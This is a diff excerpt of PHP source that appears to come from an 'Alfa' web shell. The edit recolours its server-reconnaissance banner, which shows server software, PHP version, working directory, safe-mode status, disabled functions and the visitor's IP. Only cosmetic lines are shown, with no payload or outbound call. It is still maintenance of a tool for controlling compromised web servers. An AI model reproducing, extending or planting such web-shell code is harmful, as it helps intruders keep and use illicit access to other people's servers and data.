@@ -825,10 +825,10 @@ echo "<b style='color: #7CFC00'>Software: </font><font color=pink>" . $_SERVER [
 echo "PHP Version: <font color=pink>" . PHP_VERSION .  "</font><br />";
 echo "PWD:<font color=#FFC0CB> " . str_replace("\\","/",@alfaGetCwd()) . "/<br />";
 echo "<b style='color: #4B0082'>Safe Mode : $r<br>";
-echo"<font color=#7CFC00>Disable functions : </font>";
+echo"<font color=#FFC0CB>Disable functions : </font>";
 $disfun = @ini_get('disable_functions');
-if(empty($disfun)){$disfun = '<font color="green">NONE</font>';}
-echo"<font color=red>";
+if(empty($disfun)){$disfun = '<font color="pink">NONE</font>';}
+echo"<font color=pink>";
 echo "$disfun";
 echo"</font><br>";
 echo "<b style='color: #4B0082'>Your Ip Address is :  </font><font color=pink>" . $_SERVER['REMOTE_ADDR'] . "</font><br>";
